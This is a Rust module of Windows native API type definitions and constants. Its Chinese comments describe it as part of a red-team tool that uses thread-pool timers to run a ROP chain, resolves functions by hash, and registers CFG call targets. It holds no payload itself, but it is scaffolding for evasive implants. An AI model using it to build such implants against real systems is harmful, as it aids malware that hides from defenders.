use core::ffi::c_void;
use core::ptr::null_mut;
use puerto::types::{EVENT_TYPE,HANDLE,LARGE_INTEGER};


pub type NTSTATUS = i32;


// 以下常量来自win的winnt.h/windows.h,是win os的魔数(直接和内核对话,代表固定含义)
// 详见 win相关/魔数
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_EXECUTE_READ: u64 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u64 = 0x40;
pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;
pub const CONTEXT_FULL: u32 = 0x00010007;
pub const THREAD_ALL_ACCESS: u32 = 0x001F03FF;
pub const DUPLICATE_SAME_ACCESS: u32 = 0x00000002;
pub const VM_LOCK_1: u32 = 0x0001;
pub const HEAP_GROWABLE: u32 = 0x00000002;

/// 映射官方PROCESS_MITIGATION_POLICY_INFORMATION结构体;用于检测当前进程是否开启CFG(Control Flow Guard)
/// 
/// 其原型winnt.h中的PROCESS_MITIGATION_POLICY_INFORMATION:即调用底层安全策略查询api(NtQueryInformationProcess)时传入的结构体原型.其原型定义十分复杂.其中ControlFlowGuardPolicy(c中的union字段)时一个32位位域bitfield.红队工具没有必要完全移植这个结构体(原型有几百行),从内存本质角度:不管原型union有多少策略,union的内存共享特性,它里面的所有结构体大小都是DWORD 32位的.即在内存的真实物理布局中,就是连续的8字节.内核把所有状态位都压缩在ExtendedProcessInfoBuffer在各个32位整数中,cfg关闭这个数值是0,开启则为1
/// 
/// EXTENDED_PROCESS_INFORMATION （及其对应的官方原型PROCESS_MITIGATION_POLICY_INFORMATION ）绝对不定义在 PE 文件中.这涉及内存运行时状态和硬盘静态文件结构的区别.它是存粹的运行时内存数据,函数调用结束这个结构体就结束了.这个结构体定义在winnt.h头文件中,微软官方定义.
/// 但是编译器会在pe文件中留下cfg白名单,pe文件存储cfg白名单的结构体是可选头->Data Directory(数据目录表)->IMAGE_LOAD_CONFIG_DIRECTORY （加载配置目录）中
#[repr(C)]
#[derive(Default, Clone, Copy)]
pub struct EXTENDED_PROCESS_INFORMATION {
    pub ExtendedProcessInfo: u32,
    pub ExtendedProcessInfoBuffer: u32,
}

/// 其pool字段指向,TpAllocPool创建的私有线程池.在TpAllocTimer设置的定时器,时间到了后,os底层会通过worker线程,在这个环境中唤醒并指ROP链
#[repr(C)]
#[derive(Clone, Copy)]
pub struct TP_CALLBACK_ENVIRON_V3 {
    pub Version: u32,
    pub Pool: *mut c_void,
    pub CleanupGroup: *mut c_void,
    pub CleanupGroupCancelCallback: *mut c_void,
    pub RaceDll: *mut c_void,
    pub ActivationContext: isize,
    pub FinalizationCallback: *mut c_void,
    pub u: TP_CALLBACK_ENVIRON_V3_0,
    pub CallbackPriority: i32,
    pub Size: u32,
}

impl Default for TP_CALLBACK_ENVIRON_V3 {
    fn default() -> Self {
        Self {
            Version: 3,
            Pool: null_mut(),
            CleanupGroup: null_mut(),
            CleanupGroupCancelCallback: null_mut(),
            RaceDll: null_mut(),
            ActivationContext: 0,
            FinalizationCallback: null_mut(),
            u: TP_CALLBACK_ENVIRON_V3_0 { Flags: 0 },
            CallbackPriority: 1,
            Size: size_of::<TP_CALLBACK_ENVIRON_V3>() as u32,
        }
    }
}

#[repr(C)]
#[derive(Clone, Copy)]
pub union TP_CALLBACK_ENVIRON_V3_0 {
    pub Flags: u32,
    pub s: TP_CALLBACK_ENVIRON_V3_0_0,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct TP_CALLBACK_ENVIRON_V3_0_0 {
    pub _bitfield: u32,
}

#[repr(C)]
#[derive(Default, Clone, Copy)]
pub struct TP_POOL_STACK_INFORMATION {
    pub StackReserve: usize,
    pub StackCommit: usize,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct RTL_HEAP_WALK_ENTRY {
    pub DataAddress: *mut c_void,
    pub DataSize: usize,
    pub OverheadBytes: u8,
    pub SegmentIndex: u8,
    pub Flags: u16,// 原型中这里是一个结构体,大小是2字节.
    pub Anonymous: RTL_HEAP_WALK_ENTRY_0,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub union RTL_HEAP_WALK_ENTRY_0 {
    pub Block: RTL_HEAP_WALK_ENTRY_0_0,
    pub Segment: RTL_HEAP_WALK_ENTRY_0_0_0,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct RTL_HEAP_WALK_ENTRY_0_0 {
    pub Settable: usize,
    pub TagIndex: u16,
    pub AllocatorBackTraceIndex: u16,
    pub Reserved: [u16; 2],
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct RTL_HEAP_WALK_ENTRY_0_0_0 {
    pub CommittedSize: u32,
    pub UnCommittedSize: u32,
    pub FirstEntry: *mut c_void,
    pub LastEntry: *mut c_void,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct CFG_CALL_TARGET_INFO {
    pub Offset: usize,
    pub Flags: usize,
}

pub type LPFIBER_START_ROUTINE = Option<unsafe extern "system" fn(lpFiberParameter: *mut c_void)>;
// 定义函数指针模板(类型别名 pub type =)
// extern "system"指定调用约定calling convention,在win64下指定rustc以win的fastcall(rcx/rdx/r8/r9传参)形式准备该函数的调用栈.
// 对应fn(lpParameter: *mut c_void) -> *mut c_void类型的函数.
// 这是FFI(Foreign Function Interface),rust与windws api底层交互的必经之路
// 用于get_proc_address中,通过hash/函数名遍历dll找到对应函数在内存中的物理地址(u64数值).
// ：将这个 u64 地址，通过 core::mem::transmute 强转为我们刚刚定义的 ConvertThreadToFiberFn 类型
pub type ConvertThreadToFiberFn = unsafe extern "system" fn(lpParameter: *mut c_void) -> *mut c_void;
pub type ConvertFiberToThreadFn = unsafe extern "system" fn() -> i32;
pub type SwitchToFiberFn = unsafe extern "system" fn(lpFiber: *mut c_void);
pub type DeleteFiberFn = unsafe extern "system" fn(lpFiber: *mut c_void);
pub type CreateFiberFn = unsafe extern "system" fn(
    dwStackSize: usize,
    lpStartAddress: LPFIBER_START_ROUTINE,
    lpParameter: *const c_void,
) -> *mut c_void;

pub type CloseThreadpoolFn = unsafe extern "system" fn(Pool: *mut c_void) -> NTSTATUS;
pub type TpAllocPoolFn = unsafe extern "system" fn(PoolReturn: *mut *mut c_void, Reserved: *mut c_void) -> NTSTATUS;
pub type TpSetPoolMaxThreadsFn = unsafe extern "system" fn(Pool: *mut c_void, MaxThreads: u32);
pub type TpSetPoolMinThreadsFn = unsafe extern "system" fn(Pool: *mut c_void, MinThreads: u32) -> NTSTATUS;
pub type TpSetWaitFn = unsafe extern "system" fn(Wait: *mut c_void, Handle: *mut c_void, Timeout: *mut LARGE_INTEGER);
pub type TpAllocFn = unsafe extern "system" fn(
    Timer: *mut *mut c_void,
    Callback: *mut c_void,
    Context: *mut c_void,
    CallbackEnviron: *mut TP_CALLBACK_ENVIRON_V3,
) -> NTSTATUS;

pub type TpSetPoolStackInformationFn = unsafe extern "system" fn(
    Pool: *mut c_void,
    PoolStackInformation: *mut TP_POOL_STACK_INFORMATION,
) -> NTSTATUS;

pub type TpSetTimerFn = unsafe extern "system" fn(
    Timer: *mut c_void,
    DueTime: *mut LARGE_INTEGER,
    Period: u32,
    WindowLength: u32,
);

pub type NtCloseFn = unsafe extern "system" fn(Handle: HANDLE) -> NTSTATUS;
pub type NtSetEventFn = unsafe extern "system" fn(hEvent: *mut c_void, PreviousState: *mut i32) -> NTSTATUS;
pub type NtCreateEventFn = unsafe extern "system" fn(
    EventHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    EventType: EVENT_TYPE,
    InitialState: u8,
) -> NTSTATUS;

pub type NtWaitForSingleObjectFn = unsafe extern "system" fn(
    Handle: HANDLE,
    Alertable: u8,
    Timeout: *mut i32,
) -> NTSTATUS;

pub type NtSignalAndWaitForSingleObjectFn = unsafe extern "system" fn(
    SignalHandle: HANDLE,
    WaitHandle: HANDLE,
    Alertable: u8,
    Timeout: *mut LARGE_INTEGER,
) -> NTSTATUS;

pub type NtAlertResumeThreadFn = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    PreviousSuspendCount: *mut u32,
) -> NTSTATUS;

pub type NtQueueApcThreadFn = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    ApcRoutine: *mut c_void,
    ApcArgument1: *mut c_void,
    ApcArgument2: *mut c_void,
    ApcArgument3: *mut c_void,
) -> NTSTATUS;

pub type NtQueryInformationProcessFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    ProcessInformationClass: u32,
    ProcessInformation: *mut c_void,
    ProcessInformationLength: u32,
    ReturnLength: *mut u32,
) -> NTSTATUS;

pub type NtDuplicateObjectFn = unsafe extern "system" fn(
    SourceProcessHandle: HANDLE,
    SourceHandle: HANDLE,
    TargetProcessHandle: HANDLE,
    TargetHandle: *mut HANDLE,
    DesiredAccess: u32,
    HandleAttributes: u32,
    Options: u32,
) -> NTSTATUS;

pub type NtLockVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut c_void,
    RegionSize: *mut usize,
    MapType: u32,
) -> NTSTATUS;

pub type RtlWalkHeapFn = unsafe extern "system" fn(
    HeapHandle: *mut c_void,
    Entry: *mut RTL_HEAP_WALK_ENTRY,
) -> NTSTATUS;

pub type SetProcessValidCallTargetsFn = unsafe extern "system" fn(
    hProcess: HANDLE,
    VirtualAddress: *mut c_void,
    RegionSize: usize,
    NumberOfOffsets: u32,
    OffsetInformation: *mut CFG_CALL_TARGET_INFO,
) -> u8;